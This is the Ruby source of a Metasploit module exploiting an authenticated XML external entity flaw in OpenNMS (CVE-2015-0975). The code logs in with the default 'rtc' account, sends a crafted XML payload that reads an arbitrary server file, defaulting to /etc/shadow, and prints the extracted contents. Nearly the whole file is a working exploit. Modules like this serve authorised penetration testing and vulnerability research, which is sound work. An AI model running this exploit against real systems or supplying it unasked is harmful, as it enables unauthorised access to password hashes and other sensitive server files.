##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'openssl'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'OpenNMS Authenticated XXE',
      'Description'    => %q{
      OpenNMS is vulnerable to XML External Entity Injection in the Real-Time Console interface.
      Although this attack requires authentication, there are several factors that increase the
      severity of this vulnerability.

      1. OpenNMS runs with root privileges, taken from the OpenNMS FAQ: "The difficulty with the
      core of OpenNMS is that these components need to run as root to be able to bind to low-numbered
      ports or generate network traffic that requires root"

      2. The user that you must authenticate as is the "rtc" user which has the default password of
      "rtc". There is no mention of this user in the installation guides found here:
      http://www.opennms.org/wiki/Tutorial_Installation, only mention that you should change the default
      admin password of "admin" for security purposes.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [
          'Stephen Breen <breenmachine[at]gmail.com>', # discovery
          'Justin Kennedy <jstnkndy[at]gmail.com>', # metasploit module
        ],
      'References'     => [
          ['CVE', '2015-0975']
        ],
      'DisclosureDate' => 'Jan 08 2015'
    ))

    register_options(
      [
        Opt::RPORT(8980),
        OptBool.new('SSL', [false, 'Use SSL', false]),
        OptString.new('TARGETURI', [ true, "The base path to the OpenNMS application", '/opennms/']),
        OptString.new('FILEPATH', [true, "The file or directory to read on the server", "/etc/shadow"]),
        OptString.new('USERNAME', [true, "The username to authenticate with", "rtc"]),
        OptString.new('PASSWORD', [true, "The password to authenticate with", "rtc"])
      ])

  end

  def run

    print_status("Logging in to grab a valid session cookie")

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'j_spring_security_check'),
      'vars_post' => {
        'j_username' => datastore['USERNAME'],
        'j_password' => datastore['PASSWORD'],
        'Login'=> 'Login'
      },
    })

    if res.nil?
      fail_with(Failure::Unreachable, "No response from POST request")
    elsif res.code != 302
      fail_with(Failure::UnexpectedReply, "Non-302 response from POST request")
    end

    unless res.headers["Location"].include? "index.jsp"
      fail_with(Failure::NoAccess, 'Authentication failed')
    end

    cookie = res.get_cookies

    print_status("Got cookie, going for the goods")

    rand_doctype = Rex::Text.rand_text_alpha(rand(1..10))
    rand_entity1 = Rex::Text.rand_text_alpha(rand(1..10))
    rand_entity2 = Rex::Text.rand_text_alpha(rand(1..10))
    delimiter = SecureRandom.uuid

    xxe = %Q^<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE #{rand_doctype} [
    <!ELEMENT #{rand_entity1} ANY >
    <!ENTITY #{rand_entity2} SYSTEM "file://#{datastore["FILEPATH"]}" >
    ]><#{rand_entity1}>#{delimiter}&#{rand_entity2};#{delimiter}</#{rand_entity1}>^

    res = send_request_raw({
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri.path, 'rtc', 'post/'),
      'data'   => xxe,
      'cookie' => cookie
    })

    # extract filepath data from response
    if res && res.code == 400 && res.body =~ /title.+#{delimiter}(.+)#{delimiter}.+title/m
      result = $1
      print_good("#{result}")
    else
      fail_with(Failure::Unknown, 'Error fetching file, try another')
    end

  end
end

